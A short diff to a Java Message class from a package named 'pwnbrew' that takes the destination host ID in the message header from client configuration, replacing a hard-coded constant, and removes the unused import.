@@ -48,7 +48,6 @@ import java.nio.ByteBuffer;
 import pwnbrew.ClientConfig;
 import pwnbrew.log.LoggableException;
 import pwnbrew.manager.CommManager;
-import pwnbrew.misc.Constants;
 import pwnbrew.misc.SocketUtilities;
 
 /**
@@ -90,9 +89,9 @@ public abstract class Message {
         ClientConfig theConf = ClientConfig.getConfig();
         if( theConf != null ){
             SocketUtilities.intToByteArray(srcHostId, Integer.parseInt(theConf.getHostId())); 
+            SocketUtilities.intToByteArray(destHostId,  theConf.getServerId());
         }
         
-        SocketUtilities.intToByteArray(destHostId,  Constants.SERVER_ID );                 
         SocketUtilities.intToByteArray(msgId, SocketUtilities.getNextId());        
         
         //Set the base length
